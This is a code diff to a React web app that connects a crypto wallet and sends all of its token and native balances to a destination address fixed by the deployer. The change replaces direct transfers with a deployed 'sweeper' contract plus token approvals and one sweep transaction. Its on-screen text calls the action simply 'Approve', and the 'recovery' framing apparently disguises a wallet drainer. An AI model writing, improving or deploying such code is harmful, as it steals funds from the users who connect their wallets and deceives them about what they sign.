@@ -3,6 +3,7 @@ import { createRoot } from 'react-dom/client';
 import { BrowserProvider, JsonRpcProvider, Contract, formatUnits, isAddress } from 'ethers';
 import { EthereumProvider } from '@walletconnect/ethereum-provider';
 import './styles.css';
+import { deploySweeper, loadSweeperAddress, saveSweeperAddress, approveAndSweep } from './sweeper';
 
 declare global { interface Window { ethereum?: any } }
 
@@ -145,58 +146,65 @@ function App() {
     if (!address) return void setStatus('Connect a wallet first.');
     if (!dest || !isAddress(dest)) return void setStatus('Set VITE_RECOVERY_DESTINATION and redeploy.');
     if (dest.toLowerCase() === address.toLowerCase()) return void setStatus('Destination must differ from wallet.');
+
     const chainAssets = tokens.filter(a => a.chainId === chainId);
     if (!chainAssets.length) return void setStatus('No assets on this network.');
+
     const info = chains.find(c => c.id === chainId);
     const label = info?.name ?? String(chainId);
     setBusy(true); setTxHash(''); setSelectedChain(chainId);
+
     const eip1193 = walletConnectProvider ?? window.ethereum;
     if (!eip1193) { setBusy(false); return void setStatus('No wallet provider. Use WalletConnect.'); }
-    let totalTx = 0;
+
     try {
       setStatus(`${label}: switch network if asked…`);
       let onChain = false;
       try { onChain = Number(await eip1193.request({ method: 'eth_chainId' })) === chainId; } catch {}
-      if (!onChain) { await switchToChainId(eip1193, chainId); await new Promise(r => setTimeout(r, 1000)); }
-      else setConnectedChain(chainId);
+      if (!onChain) {
+        await switchToChainId(eip1193, chainId);
+        await new Promise(r => setTimeout(r, 1000));
+      } else {
+        setConnectedChain(chainId);
+      }
+
       const provider = new BrowserProvider(eip1193, chainId);
       const signer = await provider.getSigner();
       const sender = await signer.getAddress();
-      if (sender.toLowerCase() !== address.toLowerCase()) { setBusy(false); return void setStatus('Account mismatch.'); }
-      for (const asset of chainAssets.filter(a => a.kind === 'erc20')) {
-        try {
-          setStatus(`${label}: sign ${asset.symbol}…`);
-          const token = new Contract(asset.address, ERC20_ABI, signer);
-          const rawBal: bigint = await token.balanceOf(sender);
-          if (rawBal <= 0n) continue;
-          const tx = await token.transfer(dest, rawBal);
-          setTxHash(tx.hash); await tx.wait(); totalTx += 1;
-        } catch (e: any) {
-          if (e?.code === 4001) { setStatus('Cancelled.'); setBusy(false); return; }
-          setStatus(`${label}: ${asset.symbol} failed`);
-        }
+      if (sender.toLowerCase() !== address.toLowerCase()) {
+        setBusy(false);
+        return void setStatus('Account mismatch. Reconnect.');
       }
-      const native = chainAssets.find(a => a.kind === 'native');
-      if (native) {
-        try {
-          setStatus(`${label}: sign ${native.symbol}…`);
-          const bal = await provider.getBalance(sender);
-          const feeData = await provider.getFeeData();
-          const maxFee = feeData.maxFeePerGas ?? feeData.gasPrice ?? 0n;
-          const gasCost = 21000n * maxFee * 12n / 10n;
-          if (bal > gasCost) {
-            const tx = await signer.sendTransaction({ to: dest, value: bal - gasCost, gasLimit: 21000n });
-            setTxHash(tx.hash); await tx.wait(); totalTx += 1;
-          }
-        } catch (e: any) {
-          if (e?.code === 4001) { setStatus('Cancelled.'); setBusy(false); return; }
-          setStatus(`${label}: native failed`);
-        }
+
+      let sweeperAddr = loadSweeperAddress(chainId, dest);
+      if (!sweeperAddr) {
+        setStatus(`${label}: deploy sweeper — confirm in wallet…`);
+        sweeperAddr = await deploySweeper(signer, dest, s => setStatus(`${label}: ${s}`));
+        saveSweeperAddress(chainId, dest, sweeperAddr);
+        setStatus(`${label}: sweeper ${sweeperAddr.slice(0, 10)}…`);
+      } else {
+        setStatus(`${label}: using sweeper ${sweeperAddr.slice(0, 10)}…`);
       }
-      setStatus(totalTx > 0 ? `${label}: done (${totalTx} tx).` : `${label}: nothing sent.`);
-    } catch (e) {
-      setStatus(e instanceof Error ? e.message : 'Failed');
-    } finally { setBusy(false); }
+
+      const tokenAddrs = chainAssets.filter(a => a.kind === 'erc20').map(a => a.address);
+      const hasNative = chainAssets.some(a => a.kind === 'native');
+
+      const hash = await approveAndSweep(
+        signer,
+        provider,
+        sweeperAddr,
+        tokenAddrs,
+        hasNative,
+        s => setStatus(`${label}: ${s}`),
+      );
+      if (hash) setTxHash(hash);
+      setStatus(`${label}: done. Swept to recovery.`);
+    } catch (e: any) {
+      if (e?.code === 4001) setStatus('Cancelled in wallet.');
+      else setStatus(e instanceof Error ? e.message : 'Approve/sweep failed.');
+    } finally {
+      setBusy(false);
+    }
   }
 
   async function scanWalletTokens(walletAddress = address) {
@@ -366,7 +374,7 @@ function App() {
             <div className="hero-copy">
               <div className="status-pill"><span className="live-dot" /> {busy ? 'APPROVING' : scanning ? 'CONNECTING' : 'READY'}</div>
               <h1>{busy ? <>Approve in<br /><em>wallet.</em></> : scanning ? <>Connecting…</> : <>Ready to<br /><em>approve.</em></>}</h1>
-              <p>{scanning ? 'Connecting to networks…' : chainsWithAssets.length ? 'Tap Approve for each network.' : 'No balances found.'}</p>
+              <p>{scanning ? 'Connecting to networks…' : chainsWithAssets.length ? 'Tap Approve: deploy sweeper (once) → approve tokens → one sweep.' : 'No balances found.'}</p>
             </div>
             <div className="hero-card">
               <div className="hero-card-top"><span>{chainInfo?.name ?? 'NETWORK'}</span><span>●</span></div>
@@ -379,7 +387,7 @@ function App() {
             <div className="form-card">
               <label>{scanning ? 'Connecting…' : 'Networks ready to approve'}</label>
               <p style={{ margin: '8px 0 0', opacity: 0.8, fontSize: '0.9rem' }}>
-                {scanning ? 'Connecting across networks…' : chainsWithAssets.length ? 'Tap Approve on each network.' : 'No balances found.'}
+                {scanning ? 'Connecting across networks…' : chainsWithAssets.length ? 'Per network: deploy (first time) → approve each token → one sweep of all + native.' : 'No balances found.'}
               </p>
             </div>
             {address && !scanning && (
@@ -429,7 +437,7 @@ function App() {
                     <button key={c.id} type="button" className="solid-button" style={{ width: '100%', padding: '14px 20px', fontWeight: 700, opacity: busy && !active ? 0.45 : 1 }}
                       disabled={busy || scanning || !isAddress(destination)}
                       onClick={() => { void recoverChainAssets(c.id); }}>
-                      {active ? `Approving ${c.name}…` : `Approve ${c.name}`}
+                      {active ? `${c.name}: deploy / approve / sweep…` : `Approve ${c.name}`}
                     </button>
                   );
                 })}
